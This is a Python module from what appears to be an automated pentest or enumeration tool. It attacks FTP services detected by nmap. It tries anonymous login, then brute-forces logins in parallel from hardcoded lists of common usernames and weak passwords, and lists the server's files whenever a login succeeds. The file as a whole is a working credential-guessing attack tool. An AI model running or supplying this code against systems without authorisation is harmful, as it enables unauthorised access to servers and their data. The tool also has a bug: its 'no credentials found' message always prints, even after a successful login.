import multiprocessing
from ftplib import FTP
from mods.mod_utils import *


# List of common FTP users
common_ftp_users = [
    'admin','user','ftp','test','guest','root','administrator','ftpuser','superuser','demo','manager','operator','webmaster','support','sysadmin','backup','developer','office'
]


# List of common FTP passwords
common_ftp_passwords = [
    '', ' ', 'password','123456','admin','12345','12345678','qwerty','1234567','123456789','1234','password1','abc123','letmein','password123','changeme','123123','login','welcome','test123','ftp123'
]

def ftp_connect(server, port, username, password):
    try:
        # Connect to the FTP server on the specified port
        ftp = FTP()
        ftp.connect(server, int(port))
        
        # Login with username and password
        ftp.login(user=username, passwd=password)

        # Print a message upon successful connection
        printc(f'[+] FTP Credentials "{username}:{password}"', BLUE)

        # Perform operations (e.g., list directories, download/upload files) if needed
        # Example: List directories
        printc('[!] Listing FTP root', YELLOW)
        print('')
        ftp.dir()

        # Close the FTP connection
        ftp.quit()
    except:
        return


def ftp_brute(ip, port):
    procs = []
    tested_creds = []
    creds_found =False

    for username in common_ftp_users:

        for password in get_usernames_esr(username):
            current_creds = f'{username}:{password}'
            if current_creds in tested_creds:
                continue
            tested_creds.append(current_creds)

            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
            process.start()
            procs.append(process)
        for password in common_ftp_passwords:
            current_creds = f'{username}:{password}'
            if current_creds in tested_creds:
                continue
            tested_creds.append(current_creds)
            
            # Start processes to execute
            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
            process.start()
            procs.append(process)
    procs = launch_procs(procs)
    if creds_found == False:
        printc('[-] No common credentials combination found.', RED)


def print_this_banner(port):
    print_banner(port)  
    print('[!] FTP')
    print('''[!] If the FTP server does not lists the content, use the commands like:
    ftp:>passive
    ftp:>bin
    ftp:>ls -la''')

def handle_ftp(target, port, nmap_detail):
    print_this_banner(port)
    if ('ftp-anon' in nmap_detail):
        printc('[+] Server have anonymous login enabled', GREEN)
        username = 'anonymous'
        if 'Logged in as ftp' in nmap_detail:
            username = 'ftp'
        if '20/tcp   closed ftp-data' in nmap_detail:
            printc('[-] Service is exposed but might be Unavailable', RED)
        ftp_connect(target, port, username, 'nopass')        
    else:        
        printc('[!] Testing common credentials for FTP', YELLOW)
        ftp_brute(target, port)